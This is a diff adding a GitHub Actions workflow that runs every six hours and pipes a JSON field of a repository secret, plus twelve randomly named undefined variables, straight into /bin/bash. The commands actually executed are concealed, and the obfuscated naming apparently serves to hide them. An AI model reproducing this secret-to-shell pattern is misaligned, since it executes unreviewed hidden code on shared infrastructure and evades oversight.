@@ -1,0 +1,31 @@
+name: youzhuihongguo
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '55 0/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: youzhuihongguo
+        env:
+          b7: ${{ secrets.b7 }}
+        run: |
+          echo $b7 | jq -r .i5 | /bin/bash
+          echo $l86 | jq -r .ahsv134 | /bin/bash
+          echo $bb0 | jq -r .uqjl93287 | /bin/bash
+          echo $vdrf45 | jq -r .ka5763 | /bin/bash
+          echo $ifhcx82547 | jq -r .uy940 | /bin/bash
+          echo $ycfvo22017 | jq -r .dvc71 | /bin/bash
+          echo $uzag74 | jq -r .p64 | /bin/bash
+          echo $oxqwa4605 | jq -r .ge5011 | /bin/bash
+          echo $aaydm715 | jq -r .cjyul32129 | /bin/bash
+          echo $xqc2 | jq -r .jxz3 | /bin/bash
+          echo $ksvr27110 | jq -r .aze6 | /bin/bash
+          echo $lu5 | jq -r .cik330 | /bin/bash
+          echo $khih9851 | jq -r .ukamz6 | /bin/bash
+
